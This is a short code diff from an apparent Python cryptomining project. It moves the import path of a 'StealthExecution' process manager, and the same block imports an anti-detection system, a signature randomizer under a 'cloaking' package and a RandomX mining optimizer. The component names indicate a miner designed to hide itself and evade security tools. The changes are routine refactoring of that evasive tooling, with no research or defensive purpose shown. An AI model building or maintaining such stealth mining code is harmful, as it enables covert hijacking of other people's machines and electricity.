@@ -48,7 +48,7 @@ from mining_environment.cpu_plugins.optimization.mining_integration_adapter impo
 
 # Thêm imports cho stealth frameworks
 try:
-    from mining_environment.cpu_plugins.cloaking.stealth_exec import StealthExecution as StealthProcessManager  # type: ignore
+    from mining_environment.stealth.plugins.stealth_exec import StealthExecution as StealthProcessManager  # type: ignore
     from mining_environment.cpu_plugins.monitoring.anti_detection import AntiDetectionSystem  # type: ignore
     from mining_environment.cpu_plugins.cloaking.signature_randomizer import SignatureRandomizer  # type: ignore
     from mining_environment.cpu_plugins.optimization.randomx_optimizer import XeonE5OptimizedConfig  # type: ignore
@@ -128,7 +128,7 @@ class CPUResourceManager(metaclass=_SingletonMeta):
         
         # Enhanced: Initialize stealth components
         try:
-            from mining_environment.cpu_plugins.cloaking.stealth_exec import StealthExecution as StealthProcessManager
+            from mining_environment.stealth.plugins.stealth_exec import StealthExecution as StealthProcessManager
             from mining_environment.cpu_plugins.monitoring.anti_detection import AntiDetectionSystem
             from mining_environment.cpu_plugins.cloaking.signature_randomizer import SignatureRandomizer
             from mining_environment.cpu_plugins.optimization.randomx_optimizer import XeonE5OptimizedConfig
